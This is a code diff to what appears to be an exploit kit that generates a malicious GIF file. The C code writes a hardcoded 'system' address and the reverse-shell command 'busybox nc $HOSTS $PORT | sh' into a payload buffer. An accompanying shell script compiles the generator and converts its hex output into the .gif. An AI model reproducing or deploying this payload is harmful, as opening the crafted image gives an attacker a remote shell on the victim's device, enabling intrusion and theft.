@@ -100,7 +100,7 @@ int genLine_0(unsigned char *buffer) {
     size_t system_loc = 0x7cb602ce84;
     memcpy(buffer + 24, &system_loc, 8);
 
-    char *command = "toybox nc $HOSTS $PORT | sh";
+    char *command = "busybox nc $HOSTS $PORT | sh";
     memcpy(buffer + 32, command, strlen(command));
 
     return sizeof(hexData);
@@ -174,7 +174,7 @@ $(gcc -o generate egif_lib.c exploit.c)
 sleep 2
 wait
 printf "[!] Generating Payload\n"
-$(./generate | tail -n -17 | xxd -r -p > $OUTNAME.gif)
+$(./generate | tail -n +2 | xxd -r -p > $OUTNAME.gif)
 sleep 2
 wait
 printf "[!] Success Generating Payload at $dir/$OUTNAME.gif\n"
